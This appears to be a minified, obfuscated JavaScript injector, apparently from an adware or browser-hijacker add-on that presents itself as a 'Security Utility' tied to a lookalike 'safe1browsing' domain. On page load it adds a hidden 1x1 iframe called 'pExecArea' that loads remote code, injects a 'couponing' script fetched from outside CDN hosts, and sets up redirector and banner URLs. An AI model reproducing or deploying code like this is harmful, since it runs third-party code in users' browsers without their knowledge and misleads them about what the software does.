!function(a,b){var c=1e3;setTimeout(function(){var c="lcoSlFuDPO6cy7WYg3";if("undefined"==typeof a[c]||!a[c]){var d="QbuTa7odp7XpMD2RRfL1";a[d]={},function(a,b){var c=function(a){e=!1,c.isReady=!1,"function"==typeof a&&(f=a),i()},d=a.document,e=!1,f=function(){},g=function(){d.addEventListener?d.removeEventListener("DOMContentLoaded",g,!1):d.detachEvent("onreadystatechange",g),h()},h=function(){if(!c.isReady){if(!d.body)return setTimeout(h,1);c.isReady=!0,f()}},i=function(){var b=!1;if(!e)if(e=!0,"loading"!==d.readyState&&h(),d.addEventListener)d.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1);else if(d.attachEvent){d.attachEvent("onreadystatechange",g),a.attachEvent("onload",g);try{b=null==a.frameElement}catch(c){}d.documentElement.doScroll&&b&&j()}},j=function(){if(!c.isReady){try{d.documentElement.doScroll("left")}catch(a){return void setTimeout(j,1)}h()}};c.isReady=!1,a[b].$=c}(a,d);var e,f={createAndGetScriptElement:function(a){var c=b.createElement("script");return c.type="text/javascript",c.async=!0,c.src=a,c},addScript:function(a){(b.getElementsByTagName("head")[0]||b.body).appendChild(this.createAndGetScriptElement(a))},addScriptToBody:function(a){b.body.appendChild(this.createAndGetScriptElement(a))},queryString:function(a){var b,c={},d=a,e=d.length,f=0;for(f;e>f;f++)b=d[f].split("="),void 0===c[b[0]]?c[b[0]]=b[1]:"string"==typeof c[b[0]]?c[b[0]]=[c[b[0]],b[1]]:c[b[0]].push(b[1]);return c},mergeObjects:function(a,b){var c,d={};for(c in a)a.hasOwnProperty(c)&&(d[c]=a[c]);for(c in b)b.hasOwnProperty(c)&&(d[c]=b[c]);return d},getUrlParams:function(a){var c,d=b.querySelector('script[src*="/'+a+'/cplatform.js"]'),e=d.getAttribute("src"),f=e.indexOf("?")>-1?e.substr(e.indexOf("?")+1):"";return f&&(f=this.queryString(f.split("&"))),c=!f.url&&f.name?1:0,{align:f.align||"bottomRight",poweredBy:f.name||"Security Utility",poweredUrl:f.url||"securityutility.net",textonly:c,subid:f.subid||f.extid||null}},insideIframe:function(){try{return a.self!==a.top}catch(b){return!0}},loadedInsideIframe:function(a){return b.location.host===a||this.insideIframe()}},g={domainName:"safe1browsing.net"},h="//"+g.domainName+"/public/AddOn2/",i="gdfe345121688",j=b.createElement("iframe"),k=a.addEventListener?"addEventListener":"attachEvent",l="attachEvent"===k?"onmessage":"message",m=a[k],n=((a.navigator.userLanguage||a.navigator.language).toLowerCase().split("-")[0],{init:function(a){this.time=(new Date).getTime(),this.publicAddonUrl=a.publicAddonUrl,this.getParams=a.getParams,this.partnerName=a.partnerName,this.partnerStr=this.getParams.subid?this.partnerName+"/"+this.getParams.subid:this.partnerName,this.bannerUrl=a.bannerBucketUrl,this.newTbDomain=a.newTbDomain,this.couponingScriptDomain=a.couponingScriptDomain,this.showLogo=a.showLogo},getTime:function(){return this.time},getCouponingScriptUrl:function(){return"//"+this.couponingScriptDomain+"/public/AddOn2/p/"+this.partnerStr+"/gsplugin.js?_="+this.getTime()},getRedirectorUrl:function(){return"//"+this.newTbDomain+"/public/AddOn2/events/r/a/"+this.partnerName+"?"+this.getTime()},getNewUserRedirectorUrl:function(){return"//"+this.newTbDomain+"/public/AddOn2/events/r/new/"+this.partnerName+"?"+this.getTime()},getOldUserRedirectorUrl:function(){return"//"+this.newTbDomain+"/public/AddOn2/events/r/old/"+this.partnerName+"?"+this.getTime()},getBannerUrl:function(){var a=new Date,b=a.getMonth().toString(),c=a.getDate().toString(),d=a.getHours().toString(),e=b+c+d;return this.bannerUrl+"?align="+this.getParams.align+"&poweredby="+this.getParams.poweredBy+"&poweredurl="+this.getParams.poweredUrl+"&textonly="+this.getParams.textonly+"&showLogo="+this.showLogo+"&_="+e},getAntiPhishingUrl:function(){return this.publicAddonUrl+"security/s.js"},getCouponingScriptDomain:function(){return this.couponingScriptDomain},getPExecUrl:function(){return"//"+this.couponingScriptDomain+"/public/AddOn2/static/pexec.html"}});n.init({publicAddonUrl:h,getParams:f.getUrlParams(i),partnerName:i,bannerBucketUrl:"//s3.eu-central-1.amazonaws.com/bctnr/s.js",showLogo:!1,newTbDomain:"ddctgheffl797.cloudfront.net",couponingScriptDomain:"d2p5uuu8vyzvbv.cloudfront.net"});var o={src:n.getPExecUrl(),id:"pExecArea",name:i,width:1,height:1,frameborder:0};return f.loadedInsideIframe(n.getCouponingScriptDomain())?!1:void a[d].$(function(){m(l,function(a){var b=(new Date).getTime(),c=a.data.cchpOjVok1OtRC0||b,d=b-c;if(a.data.hasOwnProperty("cchpOjVok1OtRC0")){var e=864e5;d>e&&f.addScript(n.getCouponingScriptUrl())}});for(e in o)o.hasOwnProperty(e)&&(j[e]=o[e]);b.getElementById("pExecArea")||b.body.appendChild(j)})}},c)}(window,document);